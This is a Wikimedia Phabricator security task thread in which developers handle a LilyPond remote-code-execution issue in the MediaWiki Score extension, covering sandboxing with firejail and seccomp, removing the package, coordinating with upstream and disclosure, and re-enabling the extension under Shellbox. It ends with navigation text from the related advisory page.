> In [T257062#6281474](/T257062#6281474), [@Reedy](/p/Reedy/) wrote:
>
> Could you also have a look at Lego's patch below?

[..]

> I know this isn't sufficient to re-enable lilypond as is, but for both when we do, and for the other shell scripts we still run from MW currently, this helps provide at least a more sensible firejail default profile, rather than just the contents of include /etc/firejail/globals.local, and whatever restriction has been set at point of running (things like no network) by the developer.

Looks good to me. I think we can safely move that patch to public Gerrit, though, it seems non-sensitive unless I'm missing some angle here?

[Reedy](/p/Reedy/) added a comment.[Jul 6 2020, 1:57 PM2020-07-06 13:57:25 (UTC+0)](#6281884)Comment Actions
> In [T257062#6281738](/T257062#6281738), [@MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) wrote:
>
> Looks good to me. I think we can safely move that patch to public Gerrit, though, it seems non-sensitive unless I'm missing some angle here?

I don't think so, mostly an abundance of caution by Lego when he made the patch as we still hadn't dug that deep into things.

[@Legoktm](/p/Legoktm/) want to put it in gerrit?

> In [T257062#6281715](/T257062#6281715), [@CDanis](/p/CDanis/) wrote:
> > In [T257062#6281700](/T257062#6281700), [@Tgr](/p/Tgr/) wrote:
> >
> > Given that the process for rendering scores includes two different steps which include interpreting a fully generic script language, would it not be more appropriate as a standalone service, where shell takeover could not expose the database or MediaWiki private settings?
>
> Indeed, although that of course involves much more work. [@Joe](/p/Joe/) and I had some discussion over the weekend about how to safely run "conversion lambdas" (which include Lilypond, image reformats, etc) on k8s in a sandboxed way (probably involving [gVisor](https://github.com/google/gvisor) on special 'insecure' kube hosts. We will probably put together a design document.

Of course, this isn't necessarily feasible for all installations. While this might be better for Wikimedia, trying to get upstream (whether debian and/or Lilypond themslves) to have better defaults is a win for the wider community of both MediaWiki installs and Lilypond users.

As for which might get done quicker... :)

[Reedy](/p/Reedy/) moved this task from [Incoming](/project/board/1179/) to [In Progress](/project/board/1179/) on the [Security-Team](/tag/security-team/) board.[Jul 6 2020, 3:25 PM2020-07-06 15:25:06 (UTC+0)](#6282181)[Reedy](/p/Reedy/) moved this task from [Backlog](/project/board/613/) to [In Progress](/project/board/613/) on the [MediaWiki-extensions-Score](/tag/mediawiki-extensions-score/) board.

[Legoktm](/p/Legoktm/) added a comment.[Jul 6 2020, 7:34 PM2020-07-06 19:34:57 (UTC+0)](#6283072)Comment Actions
> In [T257062#6281884](/T257062#6281884), [@Reedy](/p/Reedy/) wrote:
> > In [T257062#6281738](/T257062#6281738), [@MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) wrote:
> >
> > Looks good to me. I think we can safely move that patch to public Gerrit, though, it seems non-sensitive unless I'm missing some angle here?
>
> I don't think so, mostly an abundance of caution by Lego when he made the patch as we still hadn't dug that deep into things.
>
> [@Legoktm](/p/Legoktm/) want to put it in gerrit?

Done: [https://gerrit.wikimedia.org/r/c/operations/puppet/+/609840/](https://gerrit.wikimedia.org/r/c/operations/puppet/%2B/609840/)

[Legoktm](/p/Legoktm/) added a comment.[Jul 6 2020, 7:37 PM2020-07-06 19:37:18 (UTC+0)](#6283075)Comment Actions

I haven't seen it mentioned yet, so has filtering input before we pass it to lilypond considered? I don't know how sane the input format is for parsing, but could we ban potential unsafe things that e.g. shell out to postscript with regexes, etc.?

[Miszczyk](/p/Miszczyk/) added a comment.[Jul 6 2020, 7:51 PM2020-07-06 19:51:15 (UTC+0)](#6283118)Comment Actions

[@Legoktm](/p/Legoktm/) it might be possible to filter out anything containing Scheme code (provided that the only way to execute Scheme in LilyPond is by prefixing it with a hash, which I'm not sure of), but if we do allow Scheme, I don't believe that filtering out malicious code could be done reliably. Scheme has a very powerful (Turing-complete even) macro system, and it has run-time code evaluation as well so there's a lot of ways to obfuscate.

[Legoktm](/p/Legoktm/) added a comment.[Jul 6 2020, 11:03 PM2020-07-06 23:03:33 (UTC+0)](#6283759)Comment Actions
> In [T257062#6283118](/T257062#6283118), [@Miszczyk](/p/Miszczyk/) wrote:
>
> [@Legoktm](/p/Legoktm/) it might be possible to filter out anything containing Scheme code (provided that the only way to execute Scheme in LilyPond is by prefixing it with a hash, which I'm not sure of), but if we do allow Scheme, I don't believe that filtering out malicious code could be done reliably. Scheme has a very powerful (Turing-complete even) macro system, and it has run-time code evaluation as well so there's a lot of ways to obfuscate.

Thanks, I think this would be a good layer of defense for us to have in Score to have in addition to everything else.

> In [T257062#6277745](/T257062#6277745), [@Krinkle](/p/Krinkle/) wrote:
>
> Regarding sandbox, it depends. Could we configure the firejail to disallow all reading of disk beyond /tmp and block spawning of sub procs? I imagine LilyPond itself might need that capability. In which case I think we should only grant it that if it doesn't grant it further to the wikitext, in any form.

Trying to disallow all disk access is tricky because lilypond will need to load stuff in /usr/lib for system libraries it's compiled against. Ideally it would be configurable for people trying to run locally built lilypond versions or if it was installed to /opt, etc.

Blocking spawning of subprocesses is mostly doable though by using seccomp to disable the execve syscall (Shell:NO\_EXECVE). But that isn't compatible with lilypond because /usr/bin/lilypond is actually a shell wrapper around /usr/bin/lilypond.real to adjust the library path. I don't know if that's an artifact of the Debian packaging or just how upstream intends for lilypond to be run, but fixing that should allow us to disable the execve syscall, assuming it isn't used internally, which I haven't bothered to check.

I think long-term moving lilypond and other external binaries like pygments (which also had an RCE in our shell wrapper around it!) to an isolated service makes sense.

[MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) added a comment.[Jul 7 2020, 8:20 AM2020-07-07 08:20:28 (UTC+0)](#6284612)Comment Actions
> In [T257062#6283759](/T257062#6283759), [@Legoktm](/p/Legoktm/) wrote:
>
> Blocking spawning of subprocesses is mostly doable though by using seccomp to disable the execve syscall (Shell:NO\_EXECVE). But that isn't compatible with lilypond because /usr/bin/lilypond is actually a shell wrapper around /usr/bin/lilypond.real to adjust the library path. I don't know if that's an artifact of the Debian packaging or just how upstream intends for lilypond to be run, but fixing that should allow us to disable the execve syscall, assuming it isn't used internally, which I haven't bothered to check.

It's an artefact caused by some unrelated tech debt in Lilypond: It hasn't been ported to Guile 2.x and when Guile 1.8 was removed from Debian, they bundled a local copy of Guile 1.8 in the source package... For context: Guile 2.0 was released in February 2011, and upstream is at 3.x these days...

The way the Lilypond build detects Guile also seems broken:

```
jmm@mw1261:~$ ldd /usr/bin/lilypond.real | grep guile
        libguile.so.17 => not found
```
[Miszczyk](/p/Miszczyk/) added a comment.[Jul 7 2020, 4:19 PM2020-07-07 16:19:27 (UTC+0)](#6286119)Comment Actions

BTW, I've noticed that there are some other websites which let you execute Lilypond in unsafe mode: Lilybin and Hacklily. I guess their maintainers should also be informed about the security implications of this.

[Ebe123](/p/Ebe123/) added a comment.[Jul 8 2020, 1:25 PM2020-07-08 13:25:24 (UTC+0)](#6289303)Comment Actions

[@MoritzMuehlenhoff](/p/MoritzMuehlenhoff/): That was a big discussion in LilyPond on upgrading Guile, and is in progress. The concern with upgrading was of performance, like with strings between both versions of Guile. Five years between the previous and current version though isn't encouraging.

[MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) added a comment.[Jul 10 2020, 12:33 PM2020-07-10 12:33:11 (UTC+0)](#6296684)Comment Actions
> In [T257062#6280810](/T257062#6280810), [@MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) wrote:
>
> I'll get in touch with Lilypond wrt a secure-by-default approach, with explicit opt-in for risky features

I wrote to the main authors on Tuesday, but no reply yet. I'll wait over the weekend and otherwise I'll try a public bug on their Gitlab instance next.

[Krinkle](/p/Krinkle/) claimed this task.[Jul 10 2020, 1:57 PM2020-07-10 13:57:36 (UTC+0)](#6296842)[Krinkle](/p/Krinkle/) added a project: [Wikimedia-Incident](/tag/wikimedia-incident/).

[Krinkle](/p/Krinkle/) added a comment.[Jul 10 2020, 2:02 PM2020-07-10 14:02:51 (UTC+0)](#6296852)Comment Actions

Left for this task:

* Harden the disabling measure.
* Better communication.
* Improve on-wiki experiences.

Right now it's a single config variable assignment that if broken or missing for some reason will revert us the vulnerable state. Let's do something more, e.g. remove the lilypond package from app servers?

Comms is being worked on in an e-mail thread, I don't know the current status there.

On-wiki it currently displays a confusing error message. Communities are already working to hide this ([T257623](/T257623)), but I'll patch the extension to make this better by default. E.g. render something small, localised, friendly message indicating that new musical scores can't be created currently with a link to (something).

[hashar](/p/hashar/) updated the task description. [(Show Details)](/transactions/detail/PHID-XACT-TASK-wwer3met3bxvijv/)[Jul 10 2020, 2:08 PM2020-07-10 14:08:44 (UTC+0)](#6296872)[hashar](/p/hashar/) subscribed.Comment Actions

I have reformatted the original email to take advantage of Phabricator markdown formatting.

[Krinkle](/p/Krinkle/) added a comment.[Jul 10 2020, 2:26 PM2020-07-10 14:26:10 (UTC+0)](#6296934)Comment Actions
> * Improve on-wiki experiences.

Proposing:

| Inline |
| --- |
| [export.png (546×1 px, 158 KB)](https://phab.wmfusercontent.org/file/data/ntswmifksskkac3gij4e/PHID-FILE-f5uvc3oj6ztoinvwdr33/export.png) |
|

| Block |
| --- |
| [export2.png (616×2 px, 42 KB)](https://phab.wmfusercontent.org/file/data/l6lkqcrnwy4iso6h36zi/PHID-FILE-xcu45vz7652ebsrw5gje/export2.png) |

[Tgr](/p/Tgr/) added a comment.Edited · [Jul 10 2020, 3:19 PM2020-07-10 15:19:26 (UTC+0)](#6297050)Comment Actions

~~Have we warned third-party wikis about this? Given the severity, and that the fact that there is some security issue with Lilypond on Wikipedia is already sort of public, warning other wiki admins to disable their Lilypond extensions seems prudent.~~

I guess this is more of a question for the parent task.

[Aklapper](/p/Aklapper/) added a comment.[Jul 10 2020, 4:04 PM2020-07-10 16:04:13 (UTC+0)](#6297176)Comment Actions
> In [T257062#6296684](/T257062#6296684), [@MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) wrote:
>
> I wrote to the main authors on Tuesday, but no reply yet. I'll wait over the weekend and otherwise I'll try a public bug on their Gitlab instance next.

<https://gitlab.com/lilypond/lilypond/-/issues/new> allows to report an issue as non-public/confidential (but maybe you already implied that).

[Miszczyk](/p/Miszczyk/) added a comment.[Jul 10 2020, 4:07 PM2020-07-10 16:07:47 (UTC+0)](#6297182)Comment Actions

[@Aklapper](/p/Aklapper/) is this an official repository or just a mirror? I don't see it mentioned anywhere on lilypond.org. The one they do mention is a Savannah repo on GNU servers: <https://git.savannah.gnu.org/gitweb/?p=lilypond.git>

[Ebe123](/p/Ebe123/) added a comment.[Jul 10 2020, 4:10 PM2020-07-10 16:10:56 (UTC+0)](#6297200)Comment Actions

[@Miszczyk](/p/Miszczyk/): Yes, it's the official repository. They've just moved.

[dancy](/p/dancy/) unsubscribed.[Jul 10 2020, 4:50 PM2020-07-10 16:50:39 (UTC+0)](#6297313)[MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) added a comment.[Jul 13 2020, 1:11 PM2020-07-13 13:11:33 (UTC+0)](#6300844)Comment Actions
> In [T257062#6296852](/T257062#6296852), [@Krinkle](/p/Krinkle/) wrote:
>
> Right now it's a single config variable assignment that if broken or missing for some reason will revert us the vulnerable state. Let's do something more, e.g. remove the lilypond package from app servers?

I think that's sensible, yes. It needs an accompanying Puppet patch: [https://gerrit.wikimedia.org/r/c/operations/puppet/+/612274](https://gerrit.wikimedia.org/r/c/operations/puppet/%2B/612274)

The current way lilypond gets installed is less than ideal anyway: Due to the fact that it relied on Guile 1.8, it was marked as buggy and is not part of Debian stretch (what we run our mw fleet on). As such, the current puppetisation implicitly pulls the package from stretch-backports and due to the fact that backports is a moving target, we actually run two different versions of lilypond in production: 45 servers have 2.18.2-12~bpo9+1 and the rest has 2.19.81+really-2.18.2-13~bpo9+1...

In addition stretch-backports will vanish soon ([T256877](/T256877)), so when/if lilypond is re-enabled at some point we need to ship it as separate repo component.

[MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) added a comment.[Jul 13 2020, 2:22 PM2020-07-13 14:22:52 (UTC+0)](#6301365)Comment Actions
> In [T257062#6300844](/T257062#6300844), [@MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) wrote:
> > In [T257062#6296852](/T257062#6296852), [@Krinkle](/p/Krinkle/) wrote:
> >
> > Right now it's a single config variable assignment that if broken or missing for some reason will revert us the vulnerable state. Let's do something more, e.g. remove the lilypond package from app servers?
>
> I think that's sensible, yes. It needs an accompanying Puppet patch: [https://gerrit.wikimedia.org/r/c/operations/puppet/+/612274](https://gerrit.wikimedia.org/r/c/operations/puppet/%2B/612274)

lilypond is now removed fleet-wide.

[tstarling](/p/tstarling/) subscribed.[Jul 20 2020, 4:15 AM2020-07-20 04:15:32 (UTC+0)](#6317983)Comment Actions

Local testing suggests that even the serving of pre-generated images is broken, for no good reason. I submitted [https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Score/+/614596](https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Score/%2B/614596) and [https://gerrit.wikimedia.org/r/c/operations/mediawiki-config/+/614598](https://gerrit.wikimedia.org/r/c/operations/mediawiki-config/%2B/614598) to fix this, as well as adding a better error message per [@Krinkle](/p/Krinkle/)'s proposal above.

The next goal will be re-enabling with safe modes enabled in LilyPond and GhostScript. This will probably require a patched LilyPond package.

[tstarling](/p/tstarling/) added a comment.[Jul 20 2020, 6:16 AM2020-07-20 06:16:29 (UTC+0)](#6318027)Comment Actions
> In [T257062#6317983](/T257062#6317983), [@tstarling](/p/tstarling/) wrote:
>
> Local testing suggests that even the serving of pre-generated images is broken, for no good reason.

Actually there was a local patch on deploy1001 which fixed this. I replaced it with my fix. My two changes have been deployed.

[tstarling](/p/tstarling/) added a comment.[Jul 21 2020, 4:44 AM2020-07-21 04:44:37 (UTC+0)](#6321584)Comment Actions

The simplest workaround for the -dSAFER issue is to have LilyPond just generate PostScript, and for MediaWiki to convert the PostScript to PNG. Running LilyPond with --ps also allows it to be run under firejail with --seccomp=execve (I tested this).

> In [T257062#6278663](/T257062#6278663), [@MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) wrote:
>
> Definitely, yes! Firejail is an additional mitigation layer and defense in depth (to e.g. lessen the impact of code execution vulnerabilities in executed external binaries such as convert/image), but should never the sole safeguard against code execution. With the current (known risky) setup of Mediawiki/extensions shelling out to external binaries the individual parts which protect us are:

Obviously this contradicts the design choice made in [T171372](/T171372), which was a project to replace -dsafe with firejail. The reason for doing that was because -dsafe is a poorly-maintained mode which cannot parse most of the existing LilyPond files on the web, or even many of the examples in the LilyPond documentation.

I don't think it's reasonable to disable the extension pending a wholesale change in attitude from upstream, presumably coupled with a rewrite. That's not going to happen any time soon.

I would propose re-enabling LilyPond without -dsafe with the following changes:

* Use two layers of encapsulation instead of one. Create a wrapper service and run it inside a container which does not have a MediaWiki source tree or network access. The container would presumably be on a separate server. The wrapper service would run LilyPond under Firejail, with execve disabled.
* Cease offering .ly downloads. These present a security risk to users. Downloads of LilyPond source files could be re-enabled if they can be parsed by MediaWiki and confirmed as safe.

[CDanis](/p/CDanis/) added a comment.[Jul 21 2020, 1:16 PM2020-07-21 13:16:51 (UTC+0)](#6322657)Comment Actions
> In [T257062#6321584](/T257062#6321584), [@tstarling](/p/tstarling/) wrote:
>
> * Use two layers of encapsulation instead of one. Create a wrapper service and run it inside a container which does not have a MediaWiki source tree or network access. The container would presumably be on a separate server. The wrapper service would run LilyPond under Firejail, with execve disabled.

FTR [@Joe](/p/Joe/) has also been thinking along the lines of a generic lambdaoid infrastructure that could run untrusted shell-outs: <https://docs.google.com/document/d/1nGv5N1_PYM5Wl5TTPlkFI8TZTSokuJcmdIZD-dKZdEA/edit#heading=h.p2gimpy8t9gc>

We had also talked about possibly setting up [gvisor](https://github.com/google/gvisor) or something similar for such services -- it looks to offer stronger protections than regular containers and/or firejail.

[tstarling](/p/tstarling/) mentioned this in [T258547: LilyPond allows arbitrary PostScript and does not use -dSAFER (CVE-2020-17353)](/T258547).[Jul 22 2020, 1:06 AM2020-07-22 01:06:43 (UTC+0)](#6324814)[Jdforrester-WMF](/p/Jdforrester-WMF/) added projects: [MW-1.35-notes (1.35.0-wmf.41; 2020-07-14)](/project/view/4807/), [MW-1.36-notes (1.36.0-wmf.1; 2020-07-21)](/project/view/4480/).[Jul 22 2020, 9:34 AM2020-07-22 09:34:48 (UTC+0)](#6325620)[tstarling](/p/tstarling/) added a comment.[Jul 23 2020, 6:26 AM2020-07-23 06:26:29 (UTC+0)](#6328522)Comment Actions
> In [T257062#6321584](/T257062#6321584), [@tstarling](/p/tstarling/) wrote:
>
> The simplest workaround for the -dSAFER issue is to have LilyPond just generate PostScript, and for MediaWiki to convert the PostScript to PNG. Running LilyPond with --ps also allows it to be run under firejail with --seccomp=execve (I tested this).

This is [https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Score/+/615594](https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Score/%2B/615594) . I didn't use --seccomp=execve for LilyPond in this patch because the way the Debian package uses LD\_LIBRARY\_PATH complicates it. I don't think it's necessary before re-enabling in safe mode anyway. I used --seccomp=execve for GhostScript, since that was easy.

> * Cease offering .ly downloads. These present a security risk to users. Downloads of LilyPond source files could be re-enabled if they can be parsed by MediaWiki and confirmed as safe.

This is [https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Score/+/615595](https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Score/%2B/615595)

[Legoktm](/p/Legoktm/) added a comment.Edited · [Jul 24 2020, 12:30 AM2020-07-24 00:30:56 (UTC+0)](#6331636)Comment Actions

*Moving to [T258763: Vulnerabilities in firejail due to --output (CVE-2020-17367, CVE-2020-17368)](/T258763).*

[tstarling](/p/tstarling/) added a comment.[Jul 24 2020, 12:49 AM2020-07-24 00:49:35 (UTC+0)](#6331675)This comment was removed by [tstarling](/p/tstarling/).[tstarling](/p/tstarling/) added a comment.[Jul 31 2020, 12:52 AM2020-07-31 00:52:34 (UTC+0)](#6350646)Comment Actions

The latest action is at T257090 and [T259210](/T259210). I've disabled LilyPond execution again since it was not possible to deploy the patch for [T259210](/T259210) in a timely way.

[Krinkle](/p/Krinkle/) removed [Krinkle](/p/Krinkle/) as the assignee of this task.[Jul 31 2020, 1:16 PM2020-07-31 13:16:14 (UTC+0)](#6351504)[dr0ptp4kt](/p/dr0ptp4kt/) added a subscriber: [• brooke](/p/brooke/).[Aug 3 2020, 8:42 PM2020-08-03 20:42:03 (UTC+0)](#6357651)[Krinkle](/p/Krinkle/) moved this task from [Active investigation](/project/board/2143/) to [Awaiting report](/project/board/2143/) on the [Wikimedia-Incident](/tag/wikimedia-incident/) board.[Sep 8 2020, 1:55 PM2020-09-08 13:55:17 (UTC+0)](#6442931)[Miszczyk](/p/Miszczyk/) added a comment.[Sep 14 2020, 6:05 AM2020-09-14 06:05:54 (UTC+0)](#6457327)Comment Actions

Is the issue still being worked on? Is there some sort of timeline for developing the fix?

[Miszczyk](/p/Miszczyk/) added a comment.Edited · [Oct 12 2020, 10:09 AM2020-10-12 10:09:26 (UTC+0)](#6536121)Comment Actions

Hey guys, I want to give everyone a heads-up: I'm going to give a talk about Lilypond security on Oh My Hack conference on 28 November (<https://omhconf.pl> and I'm intending to disclose this issue. I don't think it's going to be a big deal for Wikipedia as Lilypond is now disabled, but I do think that maintainers of other MediaWiki installations should know about the impact of having this extension enabled.

[kaldari](/p/kaldari/) subscribed.[Oct 21 2020, 5:43 PM2020-10-21 17:43:41 (UTC+0)](#6569258)Comment Actions

[@MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) - Did you ever receive a response from the Lilypond authors?

[tstarling](/p/tstarling/) added a comment.[Oct 22 2020, 2:57 AM2020-10-22 02:57:45 (UTC+0)](#6570496)Comment Actions
> In [T257062#6569258](/T257062#6569258), [@kaldari](/p/kaldari/) wrote:
>
> [@MoritzMuehlenhoff](/p/MoritzMuehlenhoff/) - Did you ever receive a response from the Lilypond authors?

I received a response from Jonas Hahnfeld and Han-Wen Nienhuys and subsequently discussed the issues with them. Several related changes were made to LilyPond. There was a recent status update on the lilypond-devel list.

[tstarling](/p/tstarling/) added a comment.[Oct 22 2020, 3:02 AM2020-10-22 03:02:26 (UTC+0)](#6570502)Comment Actions

The status is that no work is currently underway in rectifying the ongoing issues with LilyPond's safe mode. The only related work I'm doing is on OS-level isolation (Shellbox).

[Miszczyk](/p/Miszczyk/) added a comment.[Dec 8 2020, 2:25 PM2020-12-08 14:25:15 (UTC+0)](#6676243)Comment Actions

The issue has been assigned CVEID CVE-2020-29007. The advisory can be found here: <https://seqred.pl/en/cve-2020-29007-remote-code-execution-in-mediawiki-score/>

[Ebe123](/p/Ebe123/) added a comment.[Dec 8 2020, 3:15 PM2020-12-08 15:15:18 (UTC+0)](#6676379)Comment Actions

[@Miszczyk](/p/Miszczyk/), the solution to the CVE would be to activate safe mode in Score, as is the default (with $wgScoreSafeMode). Disabling the extension completely is appropriate with the problems in safe mode, but is drastic for the vulnerability presented, already having a better alternative built-in.

[Miszczyk](/p/Miszczyk/) added a comment.[Dec 8 2020, 3:20 PM2020-12-08 15:20:13 (UTC+0)](#6676409)Comment Actions

[@Ebe123](/p/Ebe123/) thanks for the feedback. Is safe mode considered safe now, or are there still vulnerabilities being addressed there?

[hashar](/p/hashar/) unsubscribed.[Dec 8 2020, 3:20 PM2020-12-08 15:20:51 (UTC+0)](#6676414)[Ebe123](/p/Ebe123/) added a comment.[Dec 8 2020, 3:20 PM2020-12-08 15:20:55 (UTC+0)](#6676415)Comment Actions

No, there are still vulnerabilities in safe mode.

[Miszczyk](/p/Miszczyk/) added a comment.[Dec 8 2020, 3:25 PM2020-12-08 15:25:52 (UTC+0)](#6676423)Comment Actions

Hmm, I don't feel comfortable recommending it if it's still possible to bypass safe mode by changing the payload. If right now Score is an RCE risk one way or another, I'd prefer to keep it disabled until we have a reasonably good fix.

[sbassett](/p/sbassett/) renamed this task from Lilypond seemingly not subject to restrictions to Lilypond seemingly not subject to restrictions (CVE-2020-29007).[Dec 8 2020, 3:35 PM2020-12-08 15:35:52 (UTC+0)](#6676445)[sbassett](/p/sbassett/) mentioned this in [T276267: Security Issue Access Request for esanders](/T276267).[Mar 2 2021, 8:49 PM2021-03-02 20:49:33 (UTC+0)](#6876282)[sbassett](/p/sbassett/) moved this task from [In Progress](/project/board/1179/) to [Watching](/project/board/1179/) on the [Security-Team](/tag/security-team/) board.[May 17 2021, 4:33 PM2021-05-17 16:33:44 (UTC+0)](#7093435)[Legoktm](/p/Legoktm/) closed subtask [T258547: LilyPond allows arbitrary PostScript and does not use -dSAFER (CVE-2020-17353)](/T258547) as Resolved.[Aug 9 2021, 11:13 PM2021-08-09 23:13:49 (UTC+0)](#7271100)

[Legoktm](/p/Legoktm/) added a comment.[Aug 10 2021, 1:04 AM2021-08-10 01:04:40 (UTC+0)](#7271206)Comment Actions

With Shellbox in place, providing OS-level sandboxing/containment, I think we're mostly ready to call this resolved. There are still known safe mode bypasses, but we're OK with that given Shellbox.

I wrote up a short security advisory based on information that's already public, see [https://www.mediawiki.org/wiki/Extension:Score/2021\_security\_advisory](https://www.mediawiki.org/wiki/Extension%3AScore/2021_security_advisory), please edit/improve.

I'd like to make this task and others public mid next week when re-enabling Score everywhere.

[Miszczyk](/p/Miszczyk/) added a comment.[Aug 10 2021, 6:19 PM2021-08-10 18:19:47 (UTC+0)](#7273293)Comment Actions

[@Legoktm](/p/Legoktm/) I've added the original vulnerability (CVE-2020-29007) to the list, otherwise I think the advisory is ok.

[Legoktm](/p/Legoktm/) closed this task as Resolved.[Aug 20 2021, 9:50 PM2021-08-20 21:50:13 (UTC+0)](#7298684)[Legoktm](/p/Legoktm/) claimed this task.Comment Actions

Score+Shellbox is re-enabled on most public Wikimedia wikis now. The security advisory will be sent out to mediawiki-announce soon.

[Legoktm](/p/Legoktm/) changed the visibility from "[Custom Policy](/transactions/old/PHID-XACT-TASK-6js57dl7jwt4a5a/)" to "Public (No Login Required)".[Aug 20 2021, 9:50 PM2021-08-20 21:50:31 (UTC+0)](#7298688)[Legoktm](/p/Legoktm/) changed the edit policy from "[Custom Policy](/transactions/old/PHID-XACT-TASK-dbdvughuhu2xc34/)" to "All Users".[BEANS-X2](/p/BEANS-X2/) subscribed.[Aug 25 2021, 4:13 PM2021-08-25 16:13:19 (UTC+0)](#7308882)[Bugreporter](/p/Bugreporter/) mentioned this in [T332850: Undeploy DoubleWiki Extension from Wikimedia production](/T332850) .[Mar 23 2023, 1:09 PM2023-03-23 13:09:30 (UTC+0)](#8721038)Content licensed under Creative Commons Attribution-ShareAlike (CC BY-SA) 4.0 unless otherwise noted; code licensed under GNU General Public License (GPL) 2.0 or later and other open source licenses. By using this site, you agree to the Terms of Use, Privacy Policy, and Code of Conduct. · [Wikimedia Foundation](https://wikimediafoundation.org/) · [Privacy Policy](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ANon-wiki_privacy_policy) · [Code of Conduct](https://www.mediawiki.org/wiki/Special%3AMyLanguage/Code_of_Conduct) · [Terms of Use](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ATerms_of_Use/Phabricator) · [Disclaimer](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3AGeneral_disclaimer) · [CC-BY-SA](https://creativecommons.org/licenses/by-sa/4.0/) · [GPL](https://www.gnu.org/licenses/old-licenses/gpl-2.0.html) · [Credits](https://www.mediawiki.org/wiki/Phabricator/Credits)

=== Content from www.mediawiki.org_3a4a560e_20250119_125640.html ===
[Jump to content](#bodyContent)

Main menu

Main menu
move to sidebar
hide

Navigation

* [Main page](/wiki/MediaWiki "Visit the main page [z]")
* [Get MediaWiki](/wiki/Download)
* [Get extensions](/wiki/Special%3AMyLanguage/Category%3AExtensions)
* [Tech blog](https://techblog.wikimedia.org/)
* [Contribute](/wiki/Special%3AMyLanguage/How_to_contribute)

Support

* [User help](/wiki/Special%3AMyLanguage/Help%3AContents "The place to find out")
* [FAQ](/wiki/Special%3AMyLanguage/Manual%3AFAQ)
* [Technical manual](/wiki/Special%3AMyLanguage/Manual%3AContents)
* [Support desk](/wiki/Project%3ASupport_desk)
* [Communication](/wiki/Special%3AMyLanguage/Communication)

Development

* [Developer portal](https://developer.wikimedia.org/)
* [Code statistics](/wiki/Development_statistics)

mediawiki.org

* [Community portal](/wiki/Project%3AHelp "About the project, what you can do, where to find things")
* [Recent changes](/wiki/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Translate content](/wiki/Special%3ALanguageStats)
* [Random page](/wiki/Special%3ARandom "Load a random page [x]")
* [Village pump](/wiki/Project%3AVillage_Pump)
* [Sandbox](/wiki/Project%3ASandbox)

In other languages

[Add links](https://www.wikidata.org/wiki/Special%3ANewItem?site=mediawikiwiki&page=Extension%3AScore%2F2021+security+advisory "Add interlanguage links")

[![](/static/images/icons/mediawikiwiki.svg)
![MediaWiki](/static/images/mobile/copyright/mediawikiwiki-wordmark.svg)](/wiki/MediaWiki)

[Search](/wiki/Special%3ASearch "Search MediaWiki [f]")

Search

* English

Appearance

* [Donate](https://donate.wikimedia.org/?wmf_source=donate&wmf_medium=sidebar&wmf_campaign=www.mediawiki.org&uselang=en)
* [Create account](/w/index.php?title=Special:CreateAccount&returnto=Extension%3AScore%2F2021+security+advisory "You are encouraged to create an account and log in; however, it is not mandatory")
* [Log in](/w/index.php?title=Special:UserLogin&returnto=Extension%3AScore%2F2021+security+advisory "You are encouraged to log in; however, it is not mandatory [o]")

Personal tools

* [Donate](https://donate.wikimedia.org/?wmf_source=donate&wmf_medium=sidebar&wmf_campaign=www.mediawiki.org&uselang=en)
* [Create account](/w/index.php?title=Special:CreateAccount&returnto=Extension%3AScore%2F2021+security+advisory "You are encouraged to create an account and log in; however, it is not mandatory")
* [Log in](/w/index.php?title=Special:UserLogin&returnto=Extension%3AScore%2F2021+security+advisory "You are encouraged to log in; however, it is not mandatory [o]")

Pages for logged out editors [learn more](/wiki/Help%3AIntroduction)

* [Contributions](/wiki/Special%3AMyContributions "A list of edits made from this IP address [y]")
* [Talk](/wiki/Special%3AMyTalk "Discussion about edits from this IP address [n]")

## Contents

move to sidebar
hide

* Beginning
* [1
  Re-enabling Score](#Re-enabling_Score)

Toggle the table of contents

# Extension:Score/2021 security advisory

* [Extension](/wiki/Extension%3AScore/2021_security_advisory "View the subject page [c]")
* [Discussion](/w/index.php?title=Extension_talk:Score/2021_security_advisory&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

* [Read](/wiki/Extension%3AScore/2021_security_advisory)
* [Edit](/w/index.php?title=Extension:Score/2021_security_advisory&action=edit "Edit the source code of this page [e]")
* [View history](/w/index.php?title=Extension:Score/2021_security_advisory&action=history "Past revisions of this page [h]")

Tools

Tools
move to sidebar
hide

Actions

* [Read](/wiki/Extension%3AScore/2021_security_advisory)
* [Edit](/w/index.php?title=Extension:Score/2021_security_advisory&action=edit "Edit the source code of this page [e]")
* [View history](/w/index.php?title=Extension:Score/2021_security_advisory&action=history)

General

* [What links here](/wiki/Special%3AWhatLinksHere/Extension%3AScore/2021_security_advisory "A list of all wiki pages that link here [j]")
* [Related changes](/wiki/Special%3ARecentChangesLinked/Extension%3AScore/2021_security_advisory "Recent changes in pages linked from this page [k]")
* [Upload file](//commons.wikimedia.org/wiki/Special%3AUploadWizard "Upload files [u]")
* [Special pages](/wiki/Special%3ASpecialPages "A list of all special pages [q]")
* [Permanent link](/w/index.php?title=Extension:Score/2021_security_advisory&oldid=5924943 "Permanent link to this revision of this page")
* [Page information](/w/index.php?title=Extension:Score/2021_security_advisory&action=info "More information about this page")
* [Cite this page](/w/index.php?title=Special:CiteThisPage&page=Extension%3AScore%2F2021_security_advisory&id=5924943&wpFormIdentifier=titleform "Information on how to cite this page")
* [Get shortened URL](/w/index.php?title=Special:UrlShortener&url=https%3A%2F%2Fwww.mediawiki.org%2Fwiki%2FExtension%3AScore%2F2021_security_advisory)
